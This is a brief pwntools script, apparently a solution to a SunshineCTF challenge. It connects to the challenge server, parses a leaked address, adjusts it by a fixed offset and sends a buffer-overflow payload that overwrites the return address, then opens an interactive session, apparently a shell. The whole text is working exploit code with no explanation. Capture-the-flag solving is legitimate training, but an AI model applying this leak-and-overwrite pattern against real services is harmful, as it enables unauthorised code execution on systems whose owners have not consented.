from pwn import *

r = remote('ret.sunshinectf.org', 4301)

# leak shell address by calculating offset
r.recvuntil(': ')
leak = int(r.recvuntil('\n')[:-1],16)
leak2 = leak - (0x6ed - 0x65d)

# simple buffer over flow 
r.sendline('a' * 0x16 + p32(leak2))
r.interactive()




